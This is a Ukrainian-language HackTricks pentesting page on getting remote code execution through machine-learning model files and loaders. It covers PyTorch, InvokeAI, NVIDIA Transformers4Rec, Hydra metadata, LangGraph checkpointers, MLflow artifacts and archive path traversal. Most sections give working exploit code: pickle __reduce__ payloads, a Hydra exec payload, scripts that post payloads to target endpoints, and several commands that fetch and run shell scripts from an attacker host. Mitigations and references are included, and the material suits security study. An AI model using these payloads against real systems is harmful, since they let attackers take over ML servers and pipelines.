# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Завантаження моделей для RCE

Моделі машинного навчання зазвичай поширюються в різних форматах, як-от ONNX, TensorFlow, PyTorch тощо. Розробники можуть завантажувати ці моделі на свої комп’ютери або у виробничі системи для подальшого використання. Зазвичай моделі не повинні містити шкідливого коду, але в деяких випадках модель може використовуватися для виконання довільного коду в системі — як передбачена функція або через вразливість у бібліотеці завантаження моделей.

У таблиці нижче наведено приклади вразливостей цієї категорії:

| **Фреймворк / інструмент** | **Вразливість (CVE, якщо є)** | **Вектор RCE** | **Джерела** |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Небезпечна десеріалізація в* `torch.load` **(CVE-2025-32434)**                                                              | Шкідливий pickle у контрольній точці моделі призводить до виконання коду (в обхід захисту `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + завантаження шкідливої моделі призводить до виконання коду; RCE через десеріалізацію Java в API керування                                        | |
| **NVIDIA Merlin Transformers4Rec** | Небезпечна десеріалізація контрольної точки через `torch.load` **(CVE-2025-23298)**                                           | Недовірена контрольна точка запускає pickle reducer під час `load_model_trainer_states_from_checkpoint` → виконання коду в ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + небезпечний хук розширення MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Контрольований користувачем ключ `filter` впроваджує синтаксис SQL/JSON-path, `UNION SELECT` створює фальшивий рядок контрольної точки, а потім десеріалізація `msgpack` імпортує та викликає вибраний зловмисником код Python | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (небезпечний YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Завантаження моделі з YAML використовує `yaml.unsafe_load` (виконання коду) <br> Завантаження моделі з шаром **Lambda** виконує довільний код Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (розбір TFLite)                                                                                          | Спеціально сформована модель `.tflite` спричиняє цілочисельне переповнення → пошкодження heap (потенційний RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Завантаження моделі через `joblib.load` виконує pickle з payload зловмисника в `__reduce__`                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (небезпечний `np.load`) *оспорюється*                                                                              | Типово `numpy.load` дозволяв масиви об’єктів із pickle – шкідливий `.npy/.npz` спричиняє виконання коду                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (обхід каталогів) <br> **CVE-2024-5187** (обхід каталогів у tar)                                                    | Шлях до зовнішніх ваг моделі ONNX може виходити за межі каталогу (читання довільних файлів) <br> Шкідливий tar-файл моделі ONNX може перезаписувати довільні файли (що призводить до RCE) | |
| ONNX Runtime (ризик архітектури)  | *(Без CVE)* Користувацькі операції ONNX / керування потоком                                                                                    | Модель із користувацьким оператором вимагає завантаження нативного коду зловмисника; складні графи моделі зловживають логікою для виконання неочікуваних обчислень   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (обхід шляхів)                                                                                          | Використання API завантаження моделей із увімкненим параметром `--model-control` дає змогу обійти каталоги відносними шляхами та записувати файли (наприклад, перезаписати `.bashrc` для RCE)    | |
| **GGML (формат GGUF)**      | **CVE-2024-25664 … 25668** (кілька переповнень heap)                                                                         | Неправильно сформований файл моделі GGUF спричиняє переповнення буфера heap у парсері, що дає змогу виконати довільний код у системі жертви                     | |
| **Keras (старі формати)**   | *(Без нових CVE)* Застаріла модель Keras H5                                                                                         | Шкідлива модель HDF5 (`.h5`) із шаром Lambda і далі виконує код під час завантаження (Keras safe_mode не охоплює старий формат — «downgrade attack») | |
| **Інші** (загалом)        | *Недолік архітектури* – серіалізація Pickle                                                                                         | Багато інструментів ML (наприклад, формати моделей на основі pickle, Python `pickle.load`) виконують довільний код, вбудований у файли моделей, якщо не вжити заходів захисту | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Недовірені метадані передаються до `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Контрольовані зловмисником метадані/конфігурація моделі задають `_target_` як довільний викликаний об’єкт (наприклад, `builtins.exec`) → він виконується під час завантаження навіть із «безпечними» форматами (`.safetensors`, `.nemo`, `config.json` репозиторію) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Крім того, деякі моделі на основі Python pickle, наприклад ті, що використовуються в [PyTorch](https://github.com/pytorch/pytorch/security), можуть виконувати довільний код у системі, якщо їх завантажують не з `weights_only=True`. Тому будь-яка модель на основі pickle може бути особливо вразливою до цього типу атак, навіть якщо її не наведено в таблиці вище.

### Метадані Hydra → RCE (працює навіть із safetensors)

`hydra.utils.instantiate()` імпортує та викликає будь-який dotted `_target_` в об’єкті конфігурації/метаданих. Коли такі бібліотеки, як Hugging Face Transformers, передають **недовірені метадані моделі** до `instantiate()`, зловмисник може надати викликаний об’єкт і аргументи, які негайно запускають код під час завантаження моделі (pickle не потрібен).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Приклад payload (працює в `model_config.yaml` файлу `.nemo`, `config.json` репозиторію або `__metadata__` усередині `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Ключові моменти:
- Спрацьовує до ініціалізації моделі в `restore_from/from_pretrained` у NeMo, coders HuggingFace для uni2TS та loaders FlexTok.
- Рядковий block-list Hydra можна обійти за допомогою альтернативних шляхів імпорту (наприклад, `enum.bltns.eval`) або імен, які розв’язує застосунок (наприклад, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok також розбирає рядкові метадані за допомогою `ast.literal_eval`, що дає змогу здійснити DoS (надмірне навантаження на CPU/пам’ять) до виклику Hydra.

### 🆕  RCE в InvokeAI через `torch.load` (CVE-2024-12029)

`InvokeAI` — популярний вебінтерфейс із відкритим вихідним кодом для Stable-Diffusion. У версіях **5.3.1 – 5.4.2** доступний REST endpoint `/api/v2/models/install`, який дає змогу користувачам завантажувати моделі з довільних URL.<sup>[[1]](#references)</sup>

Зрештою endpoint викликає:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Коли наданий файл є **контрольною точкою PyTorch (`*.ckpt`)**, `torch.load` виконує **десеріалізацію pickle**. Оскільки вміст надходить безпосередньо з контрольованої користувачем URL-адреси, зловмисник може вбудувати в контрольну точку шкідливий об’єкт із власним методом `__reduce__`; цей метод виконується **під час десеріалізації**, що призводить до **віддаленого виконання коду (RCE)** на сервері InvokeAI.

Вразливості присвоєно ідентифікатор **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Покрокова демонстрація експлуатації

1. Створіть шкідливу контрольну точку:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Розмістіть `payload.ckpt` на HTTP-сервері, який ви контролюєте (наприклад, `http://ATTACKER/payload.ckpt`).
3. Викличте вразливу кінцеву точку (автентифікація не потрібна):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → gadget `os.system` запускається, і зловмисник отримує виконання коду в контексті процесу InvokeAI.

Готовий exploit: модуль **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує весь процес.<sup>[[3]](#references)</sup>

#### Умови

•  InvokeAI 5.3.1-5.4.2 (прапорець scan за замовчуванням **false**)
•  `/api/v2/models/install` доступний зловмиснику
•  Процес має дозволи на виконання команд оболонки

#### Заходи захисту

* Оновіть до **InvokeAI ≥ 5.4.3** – патч встановлює `scan=True` за замовчуванням і виконує сканування на наявність malware перед десеріалізацією.<sup>[[2]](#references)</sup>
* Під час програмного завантаження checkpoint-файлів використовуйте `torch.load(file, weights_only=True)` або новий допоміжний засіб [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Застосовуйте allow-list / підписи для джерел моделей і запускайте службу з мінімально необхідними привілеями.

> ⚠️ Пам’ятайте, що будь-який формат на основі Python pickle (зокрема багато файлів `.pt`, `.pkl`, `.ckpt`, `.pth`) за своєю суттю небезпечно десеріалізувати з ненадійних джерел.

---

Приклад тимчасового заходу захисту, якщо потрібно залишити старіші версії InvokeAI за reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Transformers4Rec (частина Merlin): RCE через небезпечний `torch.load` (CVE-2025-23298)

Transformers4Rec від NVIDIA мав небезпечний завантажувач checkpoint, який безпосередньо викликав `torch.load()` для шляхів, наданих користувачем. Оскільки `torch.load` використовує Python `pickle`, контрольований зловмисником checkpoint може виконати довільний код через reducer під час десеріалізації.<sup>[[5]](#references)</sup>

Вразливий шлях (до виправлення): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Чому це призводить до RCE: у Python pickle об’єкт може визначити reducer (`__reduce__`/`__setstate__`), який повертає функцію та аргументи. Ця функція виконується під час unpickling. Якщо такий об’єкт є в checkpoint, він виконається до використання будь-яких ваг.

Мінімальний приклад шкідливого checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Вектори доставки та масштаб наслідків:
- Троянізовані checkpoints/models, поширювані через repos, buckets або artifact registries
- Автоматизовані конвеєри resume/deploy, які автоматично завантажують checkpoints
- Виконання відбувається всередині training/inference workers, часто з підвищеними привілеями (наприклад, root у контейнерах)

Виправлення: коміт [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) замінив прямий виклик `torch.load()` на обмежений десеріалізатор зі списком дозволених типів, реалізований у `transformers4rec/utils/serialization.py`. Новий завантажувач перевіряє типи й поля та запобігає виклику довільних функцій під час завантаження.<sup>[[7]](#references)</sup>

Рекомендації із захисту, специфічні для PyTorch checkpoints:
- Не виконуйте unpickle недовірених даних. За можливості надавайте перевагу форматам без виконуваного коду, як-от [Safetensors](https://huggingface.co/docs/safetensors/index) або ONNX.
- Якщо потрібно використовувати серіалізацію PyTorch, переконайтеся, що встановлено `weights_only=True` (підтримується в новіших версіях PyTorch), або використовуйте власний unpickler зі списком дозволених типів, подібний до виправлення Transformers4Rec.<sup>[[4]](#references)</sup>
- Перевіряйте походження/підписи моделей і ізолюйте десеріалізацію в sandbox (seccomp/AppArmor; користувач без root; обмежений доступ до файлової системи та відсутність вихідного мережевого трафіку).
- Відстежуйте неочікувані дочірні процеси, запущені ML-сервісами під час завантаження checkpoint; фіксуйте використання `torch.load()`/`pickle`.

POC і посилання на вразливу версію/виправлення:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Вразливий завантажувач до виправлення: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC зі шкідливим checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Завантажувач після виправлення: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Приклад – створення шкідливої моделі PyTorch

- Створіть модель:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Завантажте модель:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Десеріалізація Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD від Tencent має endpoint `resnet`, який десеріалізує дані, контрольовані користувачем. ZDI підтвердила, що віддалений зловмисник може змусити жертву завантажити шкідливу сторінку/файл, передати звідти сформований серіалізований blob на цей endpoint і запустити десеріалізацію з правами `root`, що призведе до повної компрометації.

Потік експлуатації подібний до типового зловживання pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Будь-який gadget, до якого можна дістатися під час десеріалізації (конструктори, `__setstate__`, callbacks фреймворку тощо), можна weaponize так само — незалежно від того, чи дані передавалися через HTTP, WebSocket або файл, поміщений у каталог, за яким ведеться спостереження.



### LangGraph checkpointer SQLi → MessagePack RCE

Цей ланцюжок атак цікавий тим, що зловмиснику **не потрібно завантажувати шкідливий файл моделі**. Натомість застосунок відкриває **API для збереження стану AI-агента** (`get_state_history(..., filter=...)`), і введені користувачем дані потрапляють у конструктор запитів checkpointer.

#### 1. Структурна SQLi у фільтрах метаданих

Вразливий шаблон SQLite виглядав так:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Значення прив’язується пізніше, але `query_key` конкатенується в **рядок JSON path**, тому `'` у ключі словника виходить за межі `'$.{query_key}'` і впроваджує SQL. Те саме стосується **JSON paths, ідентифікаторів, операторів, `LIMIT` і полів TTL**: placeholders захищають лише значення, а не синтаксис запиту.

#### 2. `UNION SELECT` може спрямовувати дані до подальших sinks, а не лише викрадати їх

Запит повертає `type` і серіалізовані байти `checkpoint`, які згодом використовуються як:

```python
self.serde.loads_typed((type, checkpoint))
```

Це означає, що SQLi в умові `WHERE` може впровадити **підроблений рядок результату**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Якщо подальший код аналізує, десеріалізує, записує або виконує будь-який вибраний стовпець, зіставте ці стовпці з їхніми sinks. У цьому випадку фальшивий рядок перетворює SQLi на **десеріалізацію під контролем атакувальника**.

#### 3. Небезпечні extension hook у MessagePack еквівалентні code gadget

У шляху `msgpack` в LangGraph використовувався власний extension hook, який розпаковував вкладений tuple і виконував:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Отже, об’єкт розширення MessagePack, що кодує еквівалент `("os", "system", "id > /tmp/pwned")`, імпортує `os`, знаходить `system` і виконує команду. Під час аудиту AI-фреймворків перевіряйте **власні reviver-и MessagePack/JSON/pickle** на наявність динамічного імпорту, рефлексії або довільного виклику функцій.

#### 4. Практичний шаблон аудиту agent-фреймворків

Перевіряйте всі контрольовані користувачем дані, які потрапляють до:
- API списків історії стану / пам’яті / відтворення / контрольних точок
- конструкторів структурованих фільтрів, що генерують фрагменти SQL або запитів Redis
- власних десеріалізаторів (`pickle`, `msgpack`, хуки об’єктів `json`, конструктори YAML)
- шляхів відновлення, які довіряють рядкам, отриманим із шару збереження даних

Цей конкретний ланцюжок впливав на self-hosted розгортання LangGraph із чекпойнтерами **SQLite** або **Redis**, коли ненадійні користувачі могли контролювати `filter`. У виправлених версіях, зазначених у розкритті, це були `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` і `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Перезапис артефакту MLflow PyFunc до pickle RCE

MLflow PyFunc, створений на основі `PythonModel`, може зберігати серіалізований об’єкт як `python_model.pkl`. Метадані моделі вказують `mlflow.pyfunc.model` як її завантажувач, а реалізація MLflow використовує це ім’я файлу для збереженої Python-моделі. Отже, право запису до сховища артефактів може призвести до виконання коду в іншій програмі, яка згодом завантажить модель.<sup>[[17]](#references)[[18]](#references)</sup>

Корисний ланцюжок такий: **дозвіл на запис артефактів → заміна pickle → примусове перезавантаження моделі споживачем інференсу**. Для експерименту, що використовує кореневий шлях `mlflow-artifacts:/...` через проксі, визначте експеримент, запуск і шлях до артефактів моделі. Tracking-сервер надає методи `GET` і `PUT` за адресою `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Мінімальний reducer може виконати команду, щойно споживач виконає unpickle артефакту. Генерування payload за допомогою версії Python, зазначеної в `MLmodel`, допомагає уникнути проблем із сумісністю.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Запустіть операцію, яка **завантажує наявну модель**, наприклад prediction, scoring або deployment. Не запускайте навчання заздалегідь, оскільки воно може замінити шкідливий артефакт новою моделлю. Помилка застосунку не спростовує експлуатацію: reducer повертає цілий код завершення команди замість придатної до використання моделі. Спочатку перевірте побічний ефект, який можна спостерігати, наприклад ICMP або HTTP callback, а потім замініть його на кінцевий payload.<sup>[[20]](#references)</sup>

Під час оцінювання розрізняйте дозвіл на створення run і дозвіл на перезапис артефактів, що належать іншому run. Перевірте автентифікацію та дозволи на оновлення для кожного run, дослідіть неочікувані зміни `python_model.pkl` і враховуйте походження та цілісність моделі як частину межі виконання. Поточний код MLflow також підтримує параметр `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` і рекомендує використовувати артефакти models-from-code замість завантаження даних cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## Моделі для Path Traversal

Як зазначено в [**цьому дописі блогу**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), більшість форматів моделей, що використовуються різними AI-фреймворками, базуються на архівах, зазвичай `.zip`. Тому ці формати може бути можливо використати для атак Path Traversal, що дасть змогу читати довільні файли в системі, де завантажується модель.<sup>[[16]](#references)</sup>

Наприклад, за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створить файл у каталозі `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Або за допомогою такого коду можна створити модель, яка під час завантаження створить symlink на каталог `/tmp`:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Детальний розбір: десеріалізація Keras .keras і пошук gadget

Докладний посібник із внутрішньої будови .keras, RCE через Lambda-layer, проблеми довільного імпорту у версіях ≤ 3.8 і пошуку gadget після виправлення в межах allowlist:

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Блог OffSec – "CVE-2024-12029 – десеріалізація ненадійних даних в InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Коміт із виправленням InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Документація модуля Metasploit від Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – міркування безпеки щодо torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Блог ZDI – CVE-2025-23298: отримання віддаленого виконання коду в NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Рекомендація ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Коміт із виправленням Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Вразливий завантажувач до виправлення (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC шкідливої контрольної точки (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Завантажувач після виправлення (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – віддалене виконання коду в сучасних форматах і бібліотеках AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Документація Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Коміт зі списком блокування Hydra (попередження про RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – від SQLi до RCE: експлуатація checkpointer у LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Перетворення вразливостей Archive Slip на високоцінні баунті AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Рекомендація Snyk і proof of concept для PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Вихідний код MLflow – `model.py` PyFunc](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [REST API MLflow – кінцеві точки завантаження й вивантаження артефактів](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
